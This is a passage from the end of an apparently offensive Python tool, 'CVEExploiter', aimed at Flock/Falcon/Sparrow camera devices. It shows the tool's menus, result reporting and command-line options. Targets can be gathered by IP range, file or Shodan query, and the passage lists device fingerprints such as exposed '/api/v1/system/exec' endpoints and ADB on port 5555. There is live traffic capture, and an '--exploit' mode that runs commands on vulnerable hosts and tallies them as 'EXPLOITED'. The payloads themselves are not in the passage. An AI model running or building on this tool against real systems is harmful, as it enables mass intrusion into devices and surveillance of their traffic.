        self.print_banner()
        print(f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SCAN COMPLETE{Colors.END}
-------------------------------------------------------------
Total Scanned : {self.total_scanned}
Vulnerable    : {self.vulnerable_found}
Exploited     : {self.exploited}
-------------------------------------------------------------
{Colors.BOLD}Results by CVE{Colors.END}
-------------------------------------------------------------
{Colors.END}""")
        grouped = {}
        for r in self.results:
            cve = r.get('cve', 'Unknown')
            grouped.setdefault(cve, []).append(r)
        for cve, rs in grouped.items():
            exploited = sum(1 for r in rs if r.get('exploited', False))
            vulnerable = sum(1 for r in rs if r.get('vulnerable', False))
            print(f"""
{Colors.BOLD}{cve}{Colors.END}
  Exploited: {exploited}
  Vulnerable: {vulnerable}
  Examples:""")
            for i, r in enumerate(rs[:3], 1):
                if r.get('exploited', False):
                    print(f"    {i}. {Colors.RED}{r.get('target', 'N/A')} - EXPLOITED{Colors.END}")
                else:
                    print(f"    {i}. {r.get('target', 'N/A')} - {r.get('path', 'N/A')}")
        if self.output_file:
            self.save_results()

    def save_results(self):
        try:
            with open(self.output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n{Colors.GREEN}Results saved to {self.output_file}{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}Failed to save results: {e}{Colors.END}")

    # ═══════════════════════════════════════════════════
    #  INTERACTIVE MENU (extended)
    # ═══════════════════════════════════════════════════

    def generate_targets(self):
        print(f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SELECT INPUT METHOD{Colors.END}
-------------------------------------------------------------
 1. Single IP
 2. IP Range (CIDR)
 3. From File (IPs list)
 4. Shodan Query (requires Shodan API)
 5. Falcon/Sparrow Signatures
 6. Flock Instance Discovery (scan subnet for fingerprints)
 7. Traffic Analysis (cloud vs local station)
 8. Traffic Tap — live monitor (requires scapy)
 9. Traffic Tap — analyze PCAP file
 0. Return
-------------------------------------------------------------
{Colors.END}""")
        choice = input(f"{Colors.CYAN}Select option (1-9, 0): {Colors.END}").strip()

        # ── 6: Flock Instance Discovery ──
        if choice == '6':
            cidr = input(f"{Colors.CYAN}Enter CIDR (e.g., 192.168.1.0/24): {Colors.END}").strip()
            if not cidr:
                return []
            print(f"{Colors.YELLOW}Discovery mode does not use CVE scan queue.{Colors.END}")
            self.run_discovery(cidr)
            input(f"\n{Colors.CYAN}Press Enter to continue…{Colors.END}")
            return []  # back to menu

        # ── 7: Traffic Analysis ──
        if choice == '7':
            ip = input(f"{Colors.CYAN}Enter camera IP to analyze: {Colors.END}").strip()
            if ip:
                self.run_traffic_analysis(ip)
                input(f"\n{Colors.CYAN}Press Enter to continue…{Colors.END}")
            return []

        # ── 8: Traffic Tap (live) ──
        if choice == '8':
            if not HAVE_TAP:
                print(f"{Colors.RED}Error: flock_tap.py not found or scapy missing. pip install scapy{Colors.END}")
                input(f"{Colors.CYAN}Press Enter…{Colors.END}")
                return []
            iface = input(f"{Colors.CYAN}Interface (e.g., eth0): {Colors.END}").strip()
            if not iface:
                return []
            timeout_s = input(f"{Colors.CYAN}Capture duration in seconds (blank = unlimited): {Colors.END}").strip()
            tap_out = input(f"{Colors.CYAN}Save report to file (blank = none): {Colors.END}").strip()
            tap = FlockTrafficTap(
                interface=iface,
                verbose=self.verbose,
                output_file=tap_out or None,
                timeout=int(timeout_s) if timeout_s else None,
            )
            tap.start()
            tap.report()
            input(f"\n{Colors.CYAN}Press Enter to continue…{Colors.END}")
            return []

        # ── 9: Traffic Tap (pcap) ──
        if choice == '9':
            if not HAVE_TAP:
                print(f"{Colors.RED}Error: flock_tap.py not found or scapy missing. pip install scapy{Colors.END}")
                input(f"{Colors.CYAN}Press Enter…{Colors.END}")
                return []
            pcap_file = input(f"{Colors.CYAN}PCAP file path: {Colors.END}").strip()
            if not pcap_file or not os.path.exists(pcap_file):
                print(f"{Colors.RED}File not found: {pcap_file}{Colors.END}")
                input(f"{Colors.CYAN}Press Enter…{Colors.END}")
                return []
            tap_out = input(f"{Colors.CYAN}Save report (blank = none): {Colors.END}").strip()
            tap = FlockTrafficTap(
                pcap=pcap_file,
                verbose=self.verbose,
                output_file=tap_out or None,
            )
            tap.start()
            tap.report()
            input(f"\n{Colors.CYAN}Press Enter to continue…{Colors.END}")
            return []

        # ── Original options ──
        targets = []
        if choice == '1':
            ip = input(f"{Colors.CYAN}Enter IP: {Colors.END}").strip()
            if ip:
                targets.append(ip)
        elif choice == '2':
            cidr = input(f"{Colors.CYAN}Enter CIDR (e.g., 192.168.1.0/24): {Colors.END}").strip()
            try:
                import ipaddress
                for ip in ipaddress.ip_network(cidr, strict=False).hosts():
                    targets.append(str(ip))
            except Exception as e:
                print(f"{Colors.RED}Invalid CIDR: {e}{Colors.END}")
        elif choice == '3':
            fn = input(f"{Colors.CYAN}Enter filename: {Colors.END}").strip()
            try:
                with open(fn) as f:
                    for line in f:
                        targets.append(line.strip())
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        elif choice == '4':
            if not self.shodan_api_key:
                self.shodan_api_key = input(f"{Colors.CYAN}Enter Shodan API key: {Colors.END}").strip()
            if self.shodan_api_key:
                targets = self.get_shodan_targets(self.shodan_api_key)
                if targets:
                    print(f"{Colors.GREEN}Found {len(targets)} targets{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}No targets found{Colors.END}")
            else:
                print(f"{Colors.RED}API key required{Colors.END}")
        elif choice == '5':
            print(f"\n{Colors.CYAN}Falcon/Sparrow Signatures:{Colors.END}")
            print("  - HTTP Title: 'Falcon' or 'Sparrow'")
            print("  - /api/v1/admin/execute")
            print("  - /api/v1/system/exec")
            print("  - Port 5555 (ADB)")
            print("  - /api/v1/debug")
            print(f"{Colors.YELLOW}Requires Shodan or pre-generated targets{Colors.END}")
        elif choice == '0':
            return []
        return targets

    def run(self):
        self.print_banner()
        if self.exploit:
            print(f"{Colors.RED}{Colors.BLINK}WARNING: EXPLOITATION MODE ACTIVE{Colors.END}")
            print(f"{Colors.YELLOW}This will execute commands on vulnerable targets{Colors.END}")
            confirm = input(f"{Colors.RED}Are you sure? (yes/no): {Colors.END}")
            if confirm.lower() != 'yes':
                print(f"{Colors.YELLOW}Exiting{Colors.END}")
                return
        while True:
            targets = self.generate_targets()
            if not targets:
                if input(f"{Colors.CYAN}Exit? (y/n): {Colors.END}").lower() == 'y':
                    break
                continue
            print(f"{Colors.GREEN}Found {len(targets)} targets{Colors.END}")
            if len(targets) > 100:
                print(f"{Colors.YELLOW}Large scan — press Ctrl+C to cancel{Colors.END}")
            self.scan_network(targets)
            if input(f"{Colors.CYAN}Continue? (y/n): {Colors.END}").lower() != 'y':
                break


def main():
    parser = argparse.ArgumentParser(description='FLOCK CVE Scanner + Discovery + Traffic Analysis')
    parser.add_argument('-t', '--target', help='Single target IP')
    parser.add_argument('-f', '--file', help='File with targets')
    parser.add_argument('-o', '--output', help='Output file (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-T', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout')
    parser.add_argument('--exploit', action='store_true', help='Enable exploitation')
    parser.add_argument('--cve', help='Scan specific CVE only')
    parser.add_argument('--discover', metavar='CIDR', help='Discover Flock instances in subnet (e.g. 192.168.1.0/24)')
    parser.add_argument('--analyze-traffic', metavar='IP', help='Analyze data flow for a camera IP')
    parser.add_argument('--tap-interface', metavar='IFACE', help='Traffic Tap: live capture interface')
    parser.add_argument('--tap-pcap', metavar='FILE', help='Traffic Tap: PCAP file to analyze')
    parser.add_argument('--tap-pipe', action='store_true', help='Traffic Tap: read from stdin')
    parser.add_argument('--tap-output', metavar='FILE', help='Traffic Tap: save report to JSON')

    args = parser.parse_args()

    scanner = CVEExploiter(
        verbose=args.verbose,
        output_file=args.output,
        threads=args.threads,
        timeout=args.timeout,
        exploit=args.exploit,
    )

    # CLI shortcut for discovery
    if args.discover:
        scanner.run_discovery(args.discover)
        if args.output:
            scanner.save_results()
        return

    # CLI shortcut for traffic analysis
    if args.analyze_traffic:
        scanner.run_traffic_analysis(args.analyze_traffic)
        if args.output:
            scanner.save_results()
        return

    # CLI shortcut for Traffic Tap
    if args.tap_interface or args.tap_pcap or args.tap_pipe:
        if not HAVE_TAP:
            print(f"{Colors.RED}Error: flock_tap.py not found. Run: pip install scapy{Colors.END}")
            sys.exit(1)
        tap = FlockTrafficTap(
            interface=args.tap_interface,
            pcap=args.tap_pcap,
            pipe=args.tap_pipe,
            verbose=args.verbose,
            output_file=args.tap_output or args.output,
        )
        tap.start()
        tap.report()
        if args.output:
            # Save raw report too
            rpt = tap.generate_report()
            try:
                with open(args.output, 'w') as f:
                    json.dump(rpt, f, indent=2)
                print(f"{Colors.GREEN}Tap report saved to {args.output}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}Error saving: {e}{Colors.END}")
        return

    if args.target:
        targets = [args.target]
        scanner.scan_network(targets)
        if args.output:
            scanner.save_results()
    elif args.file:
        with open(args.file) as f:
            targets = [line.strip() for line in f]
        scanner.scan_network(targets)
        if args.output:
            scanner.save_results()
    else:
        scanner.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Scan interrupted{Colors.END}")
        sys.exit(0)
